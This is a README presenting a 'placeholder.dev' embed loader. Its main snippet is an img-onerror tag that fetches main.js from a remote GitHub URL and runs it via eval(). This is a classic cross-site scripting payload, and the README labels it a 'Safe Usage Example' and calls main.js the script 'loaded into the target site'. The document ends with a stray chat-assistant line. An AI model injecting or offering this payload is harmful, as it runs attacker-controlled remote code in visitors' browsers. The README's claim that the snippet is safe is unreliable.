## 📦 placeholder.dev Embed Script

This is an embeddable JavaScript loader for the [`placeholder.dev`](https://github.com/Ikonik24/placeholder.dev) project. It dynamically fetches and executes the latest version of `main.js` from the `main` branch of the GitHub repo.

---

### 🚀 How It Works

When this script is embedded in a website, it pulls the latest `main.js` from GitHub and runs it inside the page. This is useful for testing live scripts, dashboards, or injecting tools for development.

---

### ⚠️ Warning

> This embed method uses `eval()` and `fetch()` to load and run remote JavaScript. It **should only be used on domains you own or trust**. Never embed this on third-party websites or use it in production without understanding the security risks.

---

### ✅ Safe Usage Example

```html
<img src="#" onerror='fetch("https://raw.githubusercontent.com/Ikonik24/placeholder.dev/refs/heads/main/main.js").then(r=>r.text()).then(c=>eval(c))'>
```

Place this `<img>` tag anywhere in your HTML. When the image fails to load, it triggers the `onerror`, which fetches and executes `main.js`.

---

### 🔒 Better (Safe) Alternative

Instead of using `eval()`, consider serving the script directly:

```html
<script src="https://yourdomain.com/main.js"></script>
```

Then host your `main.js` on GitHub Pages, Vercel, or another CDN.

---

### 📁 Repo Structure

* `main.js`: Core script loaded into the target site
* `README.md`: You're reading it!
* `public/`: (Optional) Static assets or demo page

---

### 📜 License

MIT License. You can use, modify, and distribute this script, but **you are responsible for safe use**.

---

Let me know if you want a version that shows how to serve the script from GitHub Pages or Vercel instead.
